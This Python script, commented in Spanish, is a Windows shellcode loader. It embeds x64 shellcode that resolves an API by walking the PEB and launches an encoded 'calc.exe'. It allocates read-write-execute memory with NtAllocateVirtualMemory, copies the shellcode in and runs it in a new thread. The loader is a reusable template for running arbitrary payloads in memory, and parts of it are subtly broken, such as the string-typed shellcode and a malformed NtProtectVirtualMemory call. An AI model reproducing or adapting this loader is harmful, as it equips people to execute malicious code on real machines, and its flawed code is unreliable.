"""
/*
 *
 *  Fuente: https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntfreevirtualmemory
 *          https://learn.microsoft.com/es-es/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory
 *  
 *
 */
"""

import ctypes
from ctypes import wintypes


shellcode  = "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
shellcode += "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
shellcode += "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
shellcode += "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
shellcode += "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
shellcode += "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
shellcode += "\x48\x83\xec\x20\x41\xff\xd6"

shellcode_length = len(shellcode)

# Definición de los tipos de datos necesarios
ULONG_PTR = ctypes.c_ulong
PSIZE_T = ctypes.POINTER(ctypes.c_size_t )
LPDWORD = wintypes.LPDWORD
LPTHREAD_START_ROUTINE = ctypes.WINFUNCTYPE(wintypes.DWORD, wintypes.LPVOID)

# Cargar las funciones desde ntdll.dll
ntdll = ctypes.WinDLL("ntdll.dll")
NtAllocateVirtualMemory = ntdll.NtAllocateVirtualMemory
NtFreeVirtualMemory = ntdll.NtFreeVirtualMemory

# Cargar las funciones necesarias desde kernel32.dll
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
CreateThread = kernel32.CreateThread
WaitForSingleObject = kernel32.WaitForSingleObject
CloseHandle = kernel32.CloseHandle

# Definición de las constantes
MEM_COMMIT             = 0x1000
MEM_RELEASE            = 0x8000
PAGE_EXECUTE_READWRITE = 0x40
EXIT_FAILURE           = 0x01
INFINITE               = 0xFFFFFFFF

lpAddress = ctypes.c_void_p()
RegionSize = ctypes.c_size_t(shellcode_length)

status = NtAllocateVirtualMemory(
    wintypes.HANDLE(-1),
    ctypes.byref(lpAddress),
    ULONG_PTR(0),
    ctypes.byref(RegionSize),
    MEM_COMMIT,
    PAGE_EXECUTE_READWRITE
)

if status < 0:
    print("Error al reservar memoria")
    exit(EXIT_FAILURE)

# Copia del shellcode a la memoria reservada
ctypes.memmove(lpAddress, shellcode, shellcode_length)

# Función que ejecutará el shellcode
def shellcode_thread(lpParameter):
    # Ejecutar el shellcode
    ctypes.memmove(lpParameter, shellcode, len(shellcode))
    ctypes.windll.ntdll.NtProtectVirtualMemory(
        wintypes.HANDLE(-1),
        ctypes.byref(lpParameter),
        ctypes.byref(wintypes.ULONG(RegionSize)),
        PAGE_EXECUTE_READWRITE,
        ctypes.byref(wintypes.ULONG())
    )
    # Llamar al shellcode
    ctypes.CFUNCTYPE(None)(lpParameter)()

thread_id = LPDWORD()
thread_handle = CreateThread(
    None, 0, 
    LPTHREAD_START_ROUTINE(shellcode_thread), 
    lpAddress, 0, ctypes.byref(thread_id)
)

if thread_handle == 0:
    print("Error al crear el hilo")
    exit(EXIT_FAILURE)

WaitForSingleObject(thread_handle, INFINITE)
CloseHandle(thread_handle)

# Liberación de la memoria reservada
status = NtFreeVirtualMemory(
    wintypes.HANDLE(-1), 
    ctypes.byref(lpAddress), 
    ctypes.byref(RegionSize), MEM_RELEASE
)

if status < 0:
    print("Error al liberar memoria")
    exit(EXIT_FAILURE)
